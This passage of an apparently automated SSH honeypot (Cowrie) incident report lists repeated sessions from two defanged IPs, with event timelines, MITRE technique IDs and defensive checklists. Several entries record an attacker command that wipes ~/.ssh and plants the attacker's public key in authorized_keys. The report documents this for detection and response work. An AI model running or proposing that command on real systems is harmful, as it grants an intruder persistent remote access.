| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:47:59` | `cowrie.session.connect` |
| `2026-05-26 06:47:59` | `cowrie.client.version` |
| `2026-05-26 06:47:59` | `cowrie.client.kex` |
| `2026-05-26 06:48:00` | `cowrie.login.success` |
| `2026-05-26 06:48:01` | `cowrie.session.params` |
| `2026-05-26 06:48:01` | `cowrie.command.input` |
| `2026-05-26 06:48:01` | `cowrie.command.failed` |
| `2026-05-26 06:48:01` | `cowrie.log.closed` |
| `2026-05-26 06:48:02` | `cowrie.session.params` |
| `2026-05-26 06:48:02` | `cowrie.command.input` |
| `2026-05-26 06:48:02` | `cowrie.session.file_download` |
| `2026-05-26 06:48:02` | `cowrie.log.closed` |
| `2026-05-26 06:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f755a2efbe4

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:48 |
| **Last Seen** | 2026-05-26 06:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:48:06` | `cowrie.session.connect` |
| `2026-05-26 06:48:06` | `cowrie.client.version` |
| `2026-05-26 06:48:06` | `cowrie.client.kex` |
| `2026-05-26 06:48:07` | `cowrie.login.success` |
| `2026-05-26 06:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3a4a03f55c0

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:48 |
| **Last Seen** | 2026-05-26 06:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:48:36` | `cowrie.session.connect` |
| `2026-05-26 06:48:36` | `cowrie.client.version` |
| `2026-05-26 06:48:36` | `cowrie.client.kex` |
| `2026-05-26 06:48:36` | `cowrie.login.success` |
| `2026-05-26 06:48:37` | `cowrie.session.params` |
| `2026-05-26 06:48:37` | `cowrie.command.input` |
| `2026-05-26 06:48:37` | `cowrie.command.failed` |
| `2026-05-26 06:48:37` | `cowrie.log.closed` |
| `2026-05-26 06:48:37` | `cowrie.session.params` |
| `2026-05-26 06:48:37` | `cowrie.command.input` |
| `2026-05-26 06:48:37` | `cowrie.session.file_download` |
| `2026-05-26 06:48:37` | `cowrie.log.closed` |
| `2026-05-26 06:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf51db6f3f1a

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:48 |
| **Last Seen** | 2026-05-26 06:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:48:38` | `cowrie.session.connect` |
| `2026-05-26 06:48:38` | `cowrie.client.version` |
| `2026-05-26 06:48:39` | `cowrie.client.kex` |
| `2026-05-26 06:48:39` | `cowrie.login.success` |
| `2026-05-26 06:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d9801eef03a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:48 |
| **Last Seen** | 2026-05-26 06:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:48:51` | `cowrie.session.connect` |
| `2026-05-26 06:48:51` | `cowrie.client.version` |
| `2026-05-26 06:48:51` | `cowrie.client.kex` |
| `2026-05-26 06:48:52` | `cowrie.login.success` |
| `2026-05-26 06:48:53` | `cowrie.session.params` |
| `2026-05-26 06:48:53` | `cowrie.command.input` |
| `2026-05-26 06:48:53` | `cowrie.command.failed` |
| `2026-05-26 06:48:54` | `cowrie.log.closed` |
| `2026-05-26 06:48:54` | `cowrie.session.params` |
| `2026-05-26 06:48:54` | `cowrie.command.input` |
| `2026-05-26 06:48:54` | `cowrie.session.file_download` |
| `2026-05-26 06:48:54` | `cowrie.log.closed` |
| `2026-05-26 06:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-752c4941f77c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:48 |
| **Last Seen** | 2026-05-26 06:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:48:58` | `cowrie.session.connect` |
| `2026-05-26 06:48:58` | `cowrie.client.version` |
| `2026-05-26 06:48:58` | `cowrie.client.kex` |
| `2026-05-26 06:48:59` | `cowrie.login.success` |
| `2026-05-26 06:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f98f7815374

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:50 |
| **Last Seen** | 2026-05-26 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:50:17` | `cowrie.session.connect` |
| `2026-05-26 06:50:17` | `cowrie.client.version` |
| `2026-05-26 06:50:17` | `cowrie.client.kex` |
| `2026-05-26 06:50:18` | `cowrie.login.success` |
| `2026-05-26 06:50:18` | `cowrie.session.params` |
| `2026-05-26 06:50:18` | `cowrie.command.input` |
| `2026-05-26 06:50:18` | `cowrie.command.failed` |
| `2026-05-26 06:50:18` | `cowrie.log.closed` |
| `2026-05-26 06:50:18` | `cowrie.session.params` |
| `2026-05-26 06:50:18` | `cowrie.command.input` |
| `2026-05-26 06:50:18` | `cowrie.session.file_download` |
| `2026-05-26 06:50:18` | `cowrie.log.closed` |
| `2026-05-26 06:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d62fb44a9ca

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:50 |
| **Last Seen** | 2026-05-26 06:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:50:20` | `cowrie.session.connect` |
| `2026-05-26 06:50:20` | `cowrie.client.version` |
| `2026-05-26 06:50:20` | `cowrie.client.kex` |
| `2026-05-26 06:50:20` | `cowrie.login.success` |
| `2026-05-26 06:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f6730e6f33f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:51 |
| **Last Seen** | 2026-05-26 06:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:51:02` | `cowrie.session.connect` |
| `2026-05-26 06:51:02` | `cowrie.client.version` |
| `2026-05-26 06:51:03` | `cowrie.client.kex` |
| `2026-05-26 06:51:04` | `cowrie.login.success` |
| `2026-05-26 06:51:05` | `cowrie.session.params` |
| `2026-05-26 06:51:05` | `cowrie.command.input` |
| `2026-05-26 06:51:05` | `cowrie.command.failed` |
| `2026-05-26 06:51:05` | `cowrie.log.closed` |
| `2026-05-26 06:51:06` | `cowrie.session.params` |
| `2026-05-26 06:51:06` | `cowrie.command.input` |
| `2026-05-26 06:51:06` | `cowrie.session.file_download` |
| `2026-05-26 06:51:06` | `cowrie.log.closed` |
| `2026-05-26 06:51:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a555b045dee

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:51 |
| **Last Seen** | 2026-05-26 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:51:09` | `cowrie.session.connect` |
| `2026-05-26 06:51:09` | `cowrie.client.version` |
| `2026-05-26 06:51:10` | `cowrie.client.kex` |
| `2026-05-26 06:51:11` | `cowrie.login.success` |
| `2026-05-26 06:51:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-776b3bc7f1c1

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:51 |
| **Last Seen** | 2026-05-26 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:51:11` | `cowrie.session.connect` |
| `2026-05-26 06:51:11` | `cowrie.client.version` |
| `2026-05-26 06:51:11` | `cowrie.client.kex` |
| `2026-05-26 06:51:11` | `cowrie.login.success` |
| `2026-05-26 06:51:12` | `cowrie.session.params` |
| `2026-05-26 06:51:12` | `cowrie.command.input` |
| `2026-05-26 06:51:12` | `cowrie.command.failed` |
| `2026-05-26 06:51:12` | `cowrie.log.closed` |
| `2026-05-26 06:51:12` | `cowrie.session.params` |
| `2026-05-26 06:51:12` | `cowrie.command.input` |
| `2026-05-26 06:51:12` | `cowrie.session.file_download` |
| `2026-05-26 06:51:12` | `cowrie.log.closed` |
| `2026-05-26 06:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87df7b3af566

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:51 |
| **Last Seen** | 2026-05-26 06:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:51:13` | `cowrie.session.connect` |
| `2026-05-26 06:51:13` | `cowrie.client.version` |
| `2026-05-26 06:51:13` | `cowrie.client.kex` |
| `2026-05-26 06:51:14` | `cowrie.login.success` |
| `2026-05-26 06:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93e33cad0da5

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:52 |
| **Last Seen** | 2026-05-26 06:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:52:57` | `cowrie.session.connect` |
| `2026-05-26 06:52:57` | `cowrie.client.version` |
| `2026-05-26 06:52:57` | `cowrie.client.kex` |
| `2026-05-26 06:52:57` | `cowrie.login.success` |
| `2026-05-26 06:52:57` | `cowrie.session.params` |
| `2026-05-26 06:52:57` | `cowrie.command.input` |
| `2026-05-26 06:52:57` | `cowrie.command.failed` |
| `2026-05-26 06:52:58` | `cowrie.log.closed` |
| `2026-05-26 06:52:58` | `cowrie.session.params` |
| `2026-05-26 06:52:58` | `cowrie.command.input` |
| `2026-05-26 06:52:58` | `cowrie.session.file_download` |
| `2026-05-26 06:52:58` | `cowrie.log.closed` |
| `2026-05-26 06:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c0d8eefcd06

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:52 |
| **Last Seen** | 2026-05-26 06:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:52:59` | `cowrie.session.connect` |
| `2026-05-26 06:52:59` | `cowrie.client.version` |
| `2026-05-26 06:52:59` | `cowrie.client.kex` |
| `2026-05-26 06:53:00` | `cowrie.login.success` |
| `2026-05-26 06:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-155508df819c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:53 |
| **Last Seen** | 2026-05-26 06:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:53:49` | `cowrie.session.connect` |
| `2026-05-26 06:53:49` | `cowrie.client.version` |
| `2026-05-26 06:53:50` | `cowrie.client.kex` |
| `2026-05-26 06:53:51` | `cowrie.login.success` |
| `2026-05-26 06:53:52` | `cowrie.session.params` |
| `2026-05-26 06:53:52` | `cowrie.command.input` |
| `2026-05-26 06:53:52` | `cowrie.command.failed` |
| `2026-05-26 06:53:52` | `cowrie.log.closed` |
| `2026-05-26 06:53:53` | `cowrie.session.params` |
| `2026-05-26 06:53:53` | `cowrie.command.input` |
| `2026-05-26 06:53:53` | `cowrie.session.file_download` |
| `2026-05-26 06:53:53` | `cowrie.log.closed` |
| `2026-05-26 06:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d55da6313cd

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:53 |
| **Last Seen** | 2026-05-26 06:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:53:56` | `cowrie.session.connect` |
| `2026-05-26 06:53:56` | `cowrie.client.version` |
| `2026-05-26 06:53:57` | `cowrie.client.kex` |
| `2026-05-26 06:53:58` | `cowrie.login.success` |
| `2026-05-26 06:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b527b7a2e9f4

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:54 |
| **Last Seen** | 2026-05-26 06:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:54:46` | `cowrie.session.connect` |
| `2026-05-26 06:54:46` | `cowrie.client.version` |
| `2026-05-26 06:54:46` | `cowrie.client.kex` |
| `2026-05-26 06:54:47` | `cowrie.login.success` |
| `2026-05-26 06:54:48` | `cowrie.session.params` |
| `2026-05-26 06:54:48` | `cowrie.command.input` |
| `2026-05-26 06:54:48` | `cowrie.command.failed` |
| `2026-05-26 06:54:49` | `cowrie.log.closed` |
| `2026-05-26 06:54:49` | `cowrie.session.params` |
| `2026-05-26 06:54:49` | `cowrie.command.input` |
| `2026-05-26 06:54:49` | `cowrie.session.file_download` |
| `2026-05-26 06:54:49` | `cowrie.log.closed` |
| `2026-05-26 06:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82147bc03e75

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:54 |
| **Last Seen** | 2026-05-26 06:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

